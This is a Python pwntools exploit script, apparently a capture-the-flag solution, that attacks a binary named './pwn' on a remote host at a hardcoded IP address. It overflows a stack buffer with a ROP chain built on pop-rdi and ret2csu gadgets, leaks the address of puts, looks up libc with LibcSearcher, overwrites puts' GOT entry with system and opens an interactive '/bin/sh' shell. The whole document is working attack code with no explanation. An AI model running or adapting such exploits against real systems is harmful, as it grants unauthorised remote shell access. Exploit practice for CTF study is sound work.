from pwn import *
from LibcSearcher import LibcSearcher
context.log_level = "debug"
# p = process("./pwn")
p = remote("43.254.3.203", 10007)
elf = ELF("./pwn")

p.recvuntil("\n")
payload1 = p32(0x6E696B53) + p32(1) + p32(0xffffffff)
p.send(payload1)
# gdb.attach(p , "b *0x400862")

puts_got = elf.got["puts"]
puts_plt = elf.plt["puts"]	
read_got = elf.got["read"]
pop_rdi_ret = 0x00000000004008f3
addr_init = 0x4008EA
addr_call = 0x4008D0
bin_sh = 0x601089
leave_ret = 0x0000000000400884

# p.sendline("1")

# print(p.recvall())
def csu_init( addr_target_fuc_plt , arg_3 , arg_2 , arg_1 , addr_init , addr_call):
	payload   	=  p64(addr_init) + p64(0) + p64(1) + p64(addr_target_fuc_plt) + p64(arg_3) + p64(arg_2) + p64(arg_1) 
	payload 	+=	p64(addr_call) + 'a' *( 8 * 7 )	
	return payload
padding = 0x74
payload2 = padding * "a" + p64(0) # ebp
payload2 += p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt)
payload2 += csu_init(read_got , 0x10 , bin_sh , 0 , addr_init , addr_call)
payload2 += p64(pop_rdi_ret) + p64(bin_sh) + p64(puts_plt)
payload2 += csu_init(read_got , 0x8 , puts_got , 0 , addr_init , addr_call)
payload2 += p64(pop_rdi_ret) + p64(bin_sh) + p64(puts_plt)

p.send(payload2)

addr_puts = u64(p.recvuntil("\n")[:-1].ljust(8 , "\x00"))

log.success("puts : " + hex(addr_puts))
libc = LibcSearcher("puts" , addr_puts)
libc_base = addr_puts - libc.dump("puts")
system = libc_base + libc.dump("system")
str_bin_sh = libc_base + libc.dump("str_bin_sh")
# libc = ELF("/home/pwn/libc/libc-database/db/libc6_2.23-0ubuntu10_amd64.so")
# libc_base = addr_puts - libc.sym["puts"]
# system = libc_base + libc.sym["system"]
# str_bin_sh = libc_base + libc.search("/bin/sh").next() 

p.send("/bin/sh\x00")
print(p.recvuntil("\n"))
p.send(p64(system))
p.interactive()